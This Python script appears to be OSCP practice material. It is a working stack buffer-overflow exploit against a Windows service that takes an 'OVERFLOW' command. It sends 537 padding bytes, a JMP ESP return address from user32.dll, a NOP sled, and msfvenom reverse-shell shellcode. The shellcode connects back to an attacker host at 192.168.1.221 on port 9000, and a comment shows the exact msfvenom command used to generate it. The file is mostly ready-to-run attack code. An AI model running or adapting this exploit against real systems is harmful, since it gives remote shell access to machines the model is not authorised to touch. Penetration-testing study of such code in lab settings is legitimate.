#!/usr/bin/python

## NOTE: echo server uses port 22000

import sys
import argparse
import socket


# user input
program_description = "The program inputs ip and port of the victim pc"
parser = argparse.ArgumentParser(program_description)
parser.add_argument("target_ip", help="Target IP")
parser.add_argument("target_port", type=int, help="Target Port")
parser.add_argument("overflow_num", type=int, help="OSCP OVERFLOW #, please enter from 1- 10")
args = parser.parse_args()

# global parameters
user_input = (args.target_ip, args.target_port, args.overflow_num)


# function definitions
def buffer_gen(overflow_num):
    # multiple As with the eip offset at the moment of the crash for this exploit
    buf = 'A' * 537
    
    # adding the eip in format: reverse order due to little endianess. Instruction: JMP ESP from user32.dll
    #eip = "BBBB"
    eip = "\x5b\x4e\xdf\x75"
    buf = buf + eip

    # adding the eip and no-op padding
    noop = "\x90" * 20                  # 5 layer padding
    buf = buf + noop

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.221 LPORT=9000 EXITFUNC=thread -a x86 -f py -b '\x00\xa0\xad\xbe\xde\xef'
    # adding payload
    
    buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += b"\x76\x0e\x1d\x08\x0a\x09\x83\xee\xfc\xe2\xf4\xe1\xe0"
    buf += b"\x88\x09\x1d\x08\x6a\x80\xf8\x39\xca\x6d\x96\x58\x3a"
    buf += b"\x82\x4f\x04\x81\x5b\x09\x83\x78\x21\x12\xbf\x40\x2f"
    buf += b"\x2c\xf7\xa6\x35\x7c\x74\x08\x25\x3d\xc9\xc5\x04\x1c"
    buf += b"\xcf\xe8\xfb\x4f\x5f\x81\x5b\x0d\x83\x40\x35\x96\x44"
    buf += b"\x1b\x71\xfe\x40\x0b\xd8\x4c\x83\x53\x29\x1c\xdb\x81"
    buf += b"\x40\x05\xeb\x30\x40\x96\x3c\x81\x08\xcb\x39\xf5\xa5"
    buf += b"\xdc\xc7\x07\x08\xda\x30\xea\x7c\xeb\x0b\x77\xf1\x26"
    buf += b"\x75\x2e\x7c\xf9\x50\x81\x51\x39\x09\xd9\x6f\x96\x04"
    buf += b"\x41\x82\x45\x14\x0b\xda\x96\x0c\x81\x08\xcd\x81\x4e"
    buf += b"\x2d\x39\x53\x51\x68\x44\x52\x5b\xf6\xfd\x57\x55\x53"
    buf += b"\x96\x1a\xe1\x84\x40\x60\x39\x3b\x1d\x08\x62\x7e\x6e"
    buf += b"\x3a\x55\x5d\x75\x44\x7d\x2f\x1a\xf7\xdf\xb1\x8d\x09"
    buf += b"\x0a\x09\x34\xcc\x5e\x59\x75\x21\x8a\x62\x1d\xf7\xdf"
    buf += b"\x59\x4d\x58\x5a\x49\x4d\x48\x5a\x61\xf7\x07\xd5\xe9"
    buf += b"\xe2\xdd\x9d\x63\x18\x60\xca\xa1\x1c\xd5\x62\x0b\x1d"
    buf += b"\x2b\x22\x80\xfb\x62\x1a\x5f\x4a\x60\x93\xac\x69\x69"
    buf += b"\xf5\xdc\x98\xc8\x7e\x05\xe2\x46\x02\x7c\xf1\x60\xfa"
    buf += b"\xbc\xbf\x5e\xf5\xdc\x75\x6b\x67\x6d\x1d\x81\xe9\x5e"
    buf += b"\x4a\x5f\x3b\xff\x77\x1a\x53\x5f\xff\xf5\x6c\xce\x59"
    buf += b"\x2c\x36\x08\x1c\x85\x4e\x2d\x0d\xce\x0a\x4d\x49\x58"
    buf += b"\x5c\x5f\x4b\x4e\x5c\x47\x4b\x5e\x59\x5f\x75\x71\xc6"
    buf += b"\x36\x9b\xf7\xdf\x80\xfd\x46\x5c\x4f\xe2\x38\x62\x01"
    buf += b"\x9a\x15\x6a\xf6\xc8\xb3\xea\x14\x37\x02\x62\xaf\x88"
    buf += b"\xb5\x97\xf6\xc8\x34\x0c\x75\x17\x88\xf1\xe9\x68\x0d"
    buf += b"\xb1\x4e\x0e\x7a\x65\x63\x1d\x5b\xf5\xdc"
    # add the overflow num in the beginning
    buf = "OVERFLOW" + str(overflow_num) + " " + buf

    return buf


def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
    s = socket_setup(input_tuple[0], input_tuple[1])
    buf = buffer_gen(input_tuple[2])

    print "sending buffer: ", buf
    s.send(buf)

    try:
        recv = s.recv(1024)
        print "server says: ", recv
        
        while 1:
            pass
    except KeyboardInterrupt:
        print "\n[!] Closing Exploit"
        s.close()
        sys.exit(0)         # gracefully exits upon ctrl-c

# script execution
if __name__ == "__main__":
    main(user_input)        # calling main function

